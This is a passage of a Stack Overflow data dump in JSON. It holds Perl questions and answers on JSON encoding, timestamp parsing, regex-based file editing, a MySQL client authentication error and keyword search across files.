"creation_date": 1485778923, "post_id": 41935654, "comment_id": 71051797, "body": "Your code is fine. You&#39;re not printing a comma, so there is no comma. You are not using the JSON module as it&#39;s intended to be used. You should create one data structure and encode it in one go. The JSON module does not support step-by-step conversion. Also, you declare <code>$data_to_json</code> twice. Your program will not compile."}], "answers": [{"comments": [{"owner": {"reputation": 584, "user_id": 7903952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/126870117857799/picture?type=large", "display_name": "Daniel Foust", "link": "https://stackoverflow.com/users/7903952/daniel-foust"}, "edited": false, "score": 0, "creation_date": 1537969232, "post_id": 41935916, "comment_id": 91977863, "body": "What about when you are working with large data sets that are greater than memory can hold?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 584, "user_id": 7903952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/126870117857799/picture?type=large", "display_name": "Daniel Foust", "link": "https://stackoverflow.com/users/7903952/daniel-foust"}, "edited": false, "score": 0, "creation_date": 1537971109, "post_id": 41935916, "comment_id": 91979068, "body": "@DanielFoust I am not aware of a JSON implementation in Perl that allows chunking of data on encoding. <a href=\"https://metacpan.org/pod/JSON::XS#INCREMENTAL-PARSING\" rel=\"nofollow noreferrer\">metacpan.org/pod/JSON::XS#INCREMENTAL-PARSING</a> talks about parsing incrementally, but not writing out pieces bit by bit. One could build something that keeps looking at the next value to come up to decide whether to put a comma at the end and encode each individual item, then enclosing it like OP did."}, {"owner": {"reputation": 584, "user_id": 7903952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/126870117857799/picture?type=large", "display_name": "Daniel Foust", "link": "https://stackoverflow.com/users/7903952/daniel-foust"}, "edited": false, "score": 0, "creation_date": 1537971240, "post_id": 41935916, "comment_id": 91979180, "body": "That&#39;s essentially what I did.  I check if the does not exist.  If it does not exist, use JSON::XS to write hash converted to json to file, else, open the file and print &quot;,\\n$json&quot;;"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 584, "user_id": 7903952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/126870117857799/picture?type=large", "display_name": "Daniel Foust", "link": "https://stackoverflow.com/users/7903952/daniel-foust"}, "edited": false, "score": 0, "creation_date": 1537971511, "post_id": 41935916, "comment_id": 91979334, "body": "Feel free to add your own answer @Daniel. It sounds useful."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 4, "last_activity_date": 1485779157, "creation_date": 1485779157, "answer_id": 41935916, "question_id": 41935654, "link": "https://stackoverflow.com/questions/41935654/corrupted-json-encoding-in-perl-missign-comma/41935916#41935916", "title": "Corrupted JSON encoding in Perl (missign comma)", "body": "<p>If you do not print a comma, you will not get a comma.</p>\n\n<p>You are trying to build your own JSON string from pre-encoded pieces of smaller data structures. That will not work unless you tell Perl when to put commas. You could do that, but it's easier to just collect all the data into a Perl data structure that is equivalent to the JSON string you want to produce, and encode the whole thing in one go when you're done.</p>\n\n<pre><code>my $dir  = $ARGV[0];\nmy $json = JSON-&gt;new-&gt;utf8-&gt;space_after;\nmy @data;\n\nopendir( DIR, $dir ) or die $!;\nwhile ( my $file = readdir(DIR) ) {\n\n    next unless ( -f \"$dir/$file\" );\n    next unless ( $file =~ m/\\.tcserverlogs$/ );\n    my $fullPath = \"$dir/$file\";\n    my $filenameshort = basename( $file, \".tcserverlogs\" );\n\n    my $data_to_json = { \"{#LOGFILEPATH}\" =&gt; $fullPath, \"{#LOGFILE}\" =&gt; $filenameshort };\n    push @data, $data_to_json;\n}\nclosedir(DIR);\n\nprint $json-&gt;encode( { data =&gt; \\@data } );\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 5741421, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/042e2ba25bb5ddfb7695cf13207932c7?s=128&d=identicon&r=PG&f=1", "display_name": "Krusty", "link": "https://stackoverflow.com/users/5741421/krusty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 41935916, "answer_count": 1, "score": 0, "last_activity_date": 1485779157, "creation_date": 1485778342, "question_id": 41935654, "link": "https://stackoverflow.com/questions/41935654/corrupted-json-encoding-in-perl-missign-comma", "title": "Corrupted JSON encoding in Perl (missign comma)", "body": "<p>My custom code (on Perl) give next wrong JSON, missing comma between blocks:</p>\n\n<pre><code>{\n    \"data\": [{\n        \"{#LOGFILEPATH}\": \"/tmp/QRZ2007.tcserverlogs\",\n        \"{#LOGFILE}\": \"QRZ2007\"\n    } **missing comma** {\n        \"{#LOGFILE}\": \"ARZ2007\",\n        \"{#LOGFILEPATH}\": \"/tmp/ARZ2007.tcserverlogs\"\n    }]\n}\n</code></pre>\n\n<p>My terrible code:</p>\n\n<pre><code>#!/usr/bin/perl\n\n    use strict;\n    use warnings;\n    use File::Basename;\n    use utf8;\n    use JSON;\n    binmode STDOUT, \":utf8\";\n\n\n    my $dir = $ARGV[0];    \n    my $json = JSON-&gt;new-&gt;utf8-&gt;space_after;\n    opendir(DIR, $dir) or die $!;\n    print '{\"data\": [';\n    while (my $file = readdir(DIR)) {\n\n        next unless (-f \"$dir/$file\");\n\n        next unless ($file =~ m/\\.tcserverlogs$/);\n        my $fullPath = \"$dir/$file\";\n        my $filenameshort = basename($file,  \".tcserverlogs\");\n\n        my $data_to_json = {\"{#LOGFILEPATH}\"=&gt;$fullPath,\"{#LOGFILE}\"=&gt;$filenameshort};\n        my $data_to_json = {\"{#LOGFILEPATH}\"=&gt;$fullPath,\"{#LOGFILE}\"=&gt;$filenameshort};\n        print $json-&gt;encode($data_to_json);\n\n    }\n\n    print ']}'.\"\\n\";\n    closedir(DIR);\n    exit 0;\n</code></pre>\n\n<p>Dear Team i am not a programmer, please any idea how fix it, thank you!</p>\n"}, {"tags": ["string", "macos", "perl", "date"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485777982, "post_id": 41935503, "comment_id": 71051132, "body": "What&#39;s the error? I think you&#39;re missing the <i>am/pm</i> <code>%p</code> in your format."}, {"owner": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485814946, "post_id": 41935503, "comment_id": 71073284, "body": "@simbabque:<code>my @vals = _strptime($string, $format);</code> this line from Piece.pm breaks"}], "answers": [{"comments": [{"owner": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "edited": false, "score": 0, "creation_date": 1485814892, "post_id": 41935573, "comment_id": 71073258, "body": "You were right about the missing <code>%p</code> and I also had the date with double quotes. Removing the quotes and adding the &#39;%p` it seems to partially work. I.e. I get eventually the same error <code>Error parsing time</code> but I can&#39;t figure out what problem the passed in string has"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "edited": false, "score": 1, "creation_date": 1485876194, "post_id": 41935573, "comment_id": 71101098, "body": "@Jim Don&#39;t change your question after you&#39;ve gotten answers. It invalidates the work people have done and makes it confusing for future visitors, since the answers no longer correspond to the question. Instead, please post a new question. You can include a link to the original question if you think it would be helpful."}, {"owner": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485876831, "post_id": 41935573, "comment_id": 71101587, "body": "@ThisSuitIsBlackNot:Ok. I will do that. You are right"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "edited": false, "score": 1, "creation_date": 1485877986, "post_id": 41935573, "comment_id": 71102480, "body": "@Jim When you do post your question, make sure to include a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> (i.e. a complete program we can copy-and-paste and run on our own systems). The code in your edit was a good start, but it still wasn&#39;t copy-pasteable because you didn&#39;t show how <code>$date_string</code> was set, among other things. It would also help to know which OS you&#39;re on, since Time::Piece uses your system&#39;s locale for some things and that can cause platform-dependent breakages."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 7, "last_activity_date": 1485778117, "creation_date": 1485778117, "answer_id": 41935573, "question_id": 41935503, "link": "https://stackoverflow.com/questions/41935503/sort-strings-representing-datetimes-timestamps/41935573#41935573", "title": "Sort strings representing datetimes/timestamps", "body": "<p>The error I get when I run your code is</p>\n\n<blockquote>\n  <p>garbage at end of string in strptime:  AM </p>\n</blockquote>\n\n<p>You are missing the <a href=\"https://en.wikipedia.org/wiki/12-hour_clock\" rel=\"noreferrer\">period marker</a> for the <code>AM</code> in your string. Add <code>%p</code> to the pattern, which parses the local representation of <em>ante meridiem</em> or <em>post meridiem</em>. In your case, that's <em>AM</em> and <em>PM</em>.</p>\n\n<pre><code>my $format = \"%m/%d/%Y %H:%M:%S %p\";\nmy $date1= Time::Piece-&gt;strptime('1/30/2017 10:46:13 AM', $format );\n</code></pre>\n"}], "owner": {"reputation": 16982, "user_id": 1197249, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/1bd14b525fbc9b28f6ff37248ddc9074?s=128&d=identicon&r=PG", "display_name": "Jim", "link": "https://stackoverflow.com/users/1197249/jim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 41935573, "answer_count": 1, "score": 1, "last_activity_date": 1485893041, "creation_date": 1485777914, "last_edit_date": 1485893041, "question_id": 41935503, "link": "https://stackoverflow.com/questions/41935503/sort-strings-representing-datetimes-timestamps", "title": "Sort strings representing datetimes/timestamps", "body": "<p>I have a set of strings that represent date-time  in the following format:<br>\n<code>1/30/2017 10:46:13 AM</code><br>\nI would like to sort them and so I tried to convert them to actual dates as follows:  </p>\n\n<pre><code>my $format = \"%m/%d/%Y %H:%M:%S\";    \nmy $date1= Time::Piece-&gt;strptime($the_date_string, $format );      \n</code></pre>\n\n<p>It gives an error in the parsing. How can I make this work?  </p>\n"}, {"tags": ["regex", "perl", "loops", "text", "replace"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485794688, "post_id": 41935450, "comment_id": 71062357, "body": "If you had invested just 30 seconds of googling, you probably would have found the answer on your own: <a href=\"http://perldoc.perl.org/perlfaq5.html\" rel=\"nofollow noreferrer\">perlfaq5</a>"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485779909, "post_id": 41935537, "comment_id": 71052472, "body": "After you&#39;ve done this, <code>$line =~ s&#47;xyz0 = (\\S+)&#47;xyz0 = $new_value&#47;;</code> how can I write it back to the text file ?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485780214, "post_id": 41935537, "comment_id": 71052666, "body": "Write it to a new file, copy it over the original."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1485778030, "creation_date": 1485778030, "answer_id": 41935537, "question_id": 41935450, "link": "https://stackoverflow.com/questions/41935450/how-to-repeatedly-search-and-increment-a-value-in-a-text-file/41935537#41935537", "title": "How to repeatedly search and increment a value in a text file", "body": "<p>Turn on use strict and use warnings and that'll tell you that you've written <code>$xyzo</code> when you may have meant <code>$xyz0</code></p>\n\n<p>Also - you're doing a replacement on <code>$xyz0</code> and not <code>$line</code>:</p>\n\n<pre><code> $xyz0 =~ s/$xyz0/$new_value/\n</code></pre>\n\n<p>It'll work, but as it goes out of scope immediately after, it won't have actually done anything useful. </p>\n\n<p>Maybe you meant:</p>\n\n<pre><code>$line =~ s/$xyz0/$new_value/;\n</code></pre>\n\n<p>Although if your line is more complicated than just having that value on there, you do run the risk of 'hitting' the wrong value in there. (e.g. if <code>$xyz0</code> is the same value as another thing on the line). You may want to do:</p>\n\n<pre><code>$line =~ s/xyz0 = (\\S+)/xyz0 = $new_value/; \n</code></pre>\n\n<p><code>\\S+</code>  is a bit of a crude way to catch what you want though - it catches 'non whitespace' but that can be things that <em>aren't</em> numbers, and so mutiplying by 1.15 is going to produce bogus results. It's probably better to use <code>\\d+</code> or <code>[\\d\\.]+</code> to reduce the odds of that happening. (Technically <code>[\\d\\.]+</code> matches any combination of dots and numbers, so <code>1.2.3.4</code> is valid. But it's still better than <code>\\S</code>)</p>\n"}], "owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 72, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1485791477, "creation_date": 1485777772, "last_edit_date": 1485791477, "question_id": 41935450, "link": "https://stackoverflow.com/questions/41935450/how-to-repeatedly-search-and-increment-a-value-in-a-text-file", "title": "How to repeatedly search and increment a value in a text file", "body": "<p>I have to search and increment certain data from a text file. I could extract and print out the data, but I am not sure on how to update/increment it.</p>\n\n<p>There is data on a line in the file that I want to increment by 15% in a loop.</p>\n\n<pre><code>+xyz0 = 0.5 tg = 0.512 kjkj = 7543\n</code></pre>\n\n<p>I want to increment the value beside <code>abc0</code> in a loop, 15% each time, write it to a text file, run it and repeat.</p>\n\n<pre><code>open my $fh, \"&lt;\" , \".....lib\" or die \"$!\";\n\nfor ( my $i = 0; $i &lt; 10; $i++ ) {\n\n    while ( my $line = &lt;$fh&gt; ) { \n\n        if ( my ($xyz0) = $line =~ m/xyz0 = (\\S+)/ ) {\n              print $xyz0, \"\\n\"; # this prints 0.005 \n              $new_value = $xyzo * 1.15; \n              $xyz0 =~ s/$xyz0/$new_value/;\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["mysql", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485790331, "post_id": 41934936, "comment_id": 71059486, "body": "DBD::mysql doesn&#39;t use the CLI, it uses the C API, so upgrading the client won&#39;t affect your Perl code. Try upgrading DBD::mysql."}, {"owner": {"reputation": 1, "user_id": 6320890, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ebd086eb796dba04e8157fd059c82e1?s=128&d=identicon&r=PG&f=1", "display_name": "vishnu priya", "link": "https://stackoverflow.com/users/6320890/vishnu-priya"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485844968, "post_id": 41934936, "comment_id": 71081905, "body": "Do I need to upgrade DBD::mysql to latest version?"}], "answers": [{"tags": [], "owner": {"reputation": 710, "user_id": 3393515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ded562a66b740f168b4f1b39b54e0e2?s=128&d=identicon&r=PG", "display_name": "M&#225;rcio Rossato", "link": "https://stackoverflow.com/users/3393515/m%c3%a1rcio-rossato"}, "is_accepted": false, "score": 0, "last_activity_date": 1496668957, "last_edit_date": 1496668957, "creation_date": 1496667367, "answer_id": 44369461, "question_id": 41934936, "link": "https://stackoverflow.com/questions/41934936/client-does-not-support-authentication-protocol-requested-by-server-consider-up/44369461#44369461", "title": "Client does not support authentication protocol requested by server; consider upgrading MySQL client", "body": "<p>in my.conf\nadd</p>\n\n<p>[mysqld]<br>\nskip-secure-auth=true</p>\n\n<p>it permiss use old protocol, but your security exists no more. Do it only in development ambient.</p>\n"}], "owner": {"reputation": 1, "user_id": 6320890, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ebd086eb796dba04e8157fd059c82e1?s=128&d=identicon&r=PG&f=1", "display_name": "vishnu priya", "link": "https://stackoverflow.com/users/6320890/vishnu-priya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1074, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1496668957, "creation_date": 1485776186, "last_edit_date": 1485791762, "question_id": 41934936, "link": "https://stackoverflow.com/questions/41934936/client-does-not-support-authentication-protocol-requested-by-server-consider-up", "title": "Client does not support authentication protocol requested by server; consider upgrading MySQL client", "body": "<p>I am trying to connect MySQL client through a Perl script. But again and again I am getting error</p>\n\n<blockquote>\n  <p>ERROR 1251: Client does not support authentication protocol requested by server; consider upgrading MySQL client</p>\n</blockquote>\n\n<p>My MySQL client has been upgraded from 5.1 to 5.6.</p>\n\n<p>I am using Perl v5.12.0, <code>DBD::mysql</code> is 4.017, <code>DBI</code> is 1.613.</p>\n\n<p>Is this problem with the Perl module or with MySQL.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "edited": false, "score": 2, "creation_date": 1485776836, "post_id": 41934916, "comment_id": 71050402, "body": "Welcome to the site. What have you tried?"}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "reply_to_user": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "edited": false, "score": 0, "creation_date": 1485778134, "post_id": 41934916, "comment_id": 71051222, "body": "I have tried the below code but It does not give me the output i want"}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "reply_to_user": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "edited": false, "score": 0, "creation_date": 1485778209, "post_id": 41934916, "comment_id": 71051274, "body": "# open(MYINPUTFILE, &quot;&lt;expressions.txt&quot;); # open for input # my(@lines) = &lt;MYINPUTFILE&gt;;  # #print @lines;   # my @files = grep ( -f ,&lt;*main_log&gt;,&lt;*Project&gt;);    # $n = 0;    # $l = 0;     # #foreach my$file (@files){        # foreach my $line(@lines)    # {    # my @f = grep /$line/,@files;    # print &quot;@f\\n&quot;;    # }            # #}  # }"}, {"owner": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "edited": false, "score": 0, "creation_date": 1485778449, "post_id": 41934916, "comment_id": 71051448, "body": "For future reference, you can edit your question to make changes, like I have to include the code"}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485781629, "post_id": 41934916, "comment_id": 71053590, "body": "Are the files in your example all named e.g. &#39;mymail_log&#39;,&#39;123Project&#39; etc.? Because it looks like you maybe try to get files from a folder. Please test if your <code>@files</code> really contains the files you want to use for the keyword search."}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485782131, "post_id": 41934916, "comment_id": 71053954, "body": "Also you&#39;re looking for the keywords in the filenames only. If you wish to search the <i>content</i> of your files, you have to either open each of them yourself and go through the lines, or use something like File::Grep."}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485782363, "post_id": 41934916, "comment_id": 71054123, "body": "yes, It does contain the file named main_log Inside the Folder"}], "answers": [{"comments": [{"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "edited": false, "score": 0, "creation_date": 1485785094, "post_id": 41937591, "comment_id": 71055957, "body": "I intentionally used &#39;keyword first&#39; in this example, since no preference was given in the question. If the OP wants it &#39;line number first&#39; ordered, he can adopt the change easily. The principle should be clear."}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485786448, "post_id": 41937591, "comment_id": 71056864, "body": "I am not able to search more than one keyword if put under expressions.txt like below e.g. Hello world bye ... longsting all in new line treating as separate keywords"}, {"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "reply_to_user": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485788944, "post_id": 41937591, "comment_id": 71058556, "body": "I&#39;m sorry, the keywords array still contained the newlines at the end. Fixed it by <code>chomp</code>ing..."}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485838241, "post_id": 41937591, "comment_id": 71079458, "body": "It works fine now .. can you please help to explain the below line printf &#39;Found keyword %s in file %s, line %d:%s&#39;.$/, $kw, $file, $l, $_"}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485839557, "post_id": 41937591, "comment_id": 71079878, "body": "What If I want to add a comment In the keywords In square brackets to print separately but not as part of search e.g. Hello World [This Is just welcome message] Hello World should be the keyword but text under square brackets should be the comments displayed when found this keyword."}, {"owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "edited": false, "score": 0, "creation_date": 1485926025, "post_id": 41937591, "comment_id": 71122883, "body": "What If I want to add a comment In the keywords In square brackets to print separately but not as part of search e.g. Hello World [This Is just welcome message] Hello World should be the keyword but text under square brackets should be the comments displayed when found this keyword."}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": true, "score": 0, "last_activity_date": 1485943259, "last_edit_date": 1485943259, "creation_date": 1485784445, "answer_id": 41937591, "question_id": 41934916, "link": "https://stackoverflow.com/questions/41934916/perl-how-to-search-a-indefinite-list-of-keywords-from-a-list-of-files-in-a-fol/41937591#41937591", "title": "Perl : How to search a Indefinite list of keywords from a list of files in a folder", "body": "<p>This answer is based on your posted code:</p>\n\n<pre><code>use strict; # always use these\nuse warnings; \n\nopen( my $kw, '&lt;', 'expressions.txt') or die $!;\nmy @keywords = &lt;$kw&gt;;\nchomp(@keywords); # remove newlines at the end of keywords\n\n# get list of files in current directory\nmy @files = grep { -f } (&lt;*main_log&gt;,&lt;*Project&gt;);\n\n# loop over each file to search keywords in\nforeach my $file (@files) {\n  open(my $fh, '&lt;', $file) or die $!;\n  my @content = &lt;$fh&gt;;\n  close($fh);\n  my $l = 0;\n  foreach my $kw (@keywords) {\n    my $search = quotemeta($kw); # otherwise keyword is used as regex, not literally\n    foreach (@content) { # go through every line for this keyword\n      $l++;\n      printf 'Found keyword %s in file %s, line %d:%s'.$/, $kw, $file, $l, $_\n        if /$search/;\n    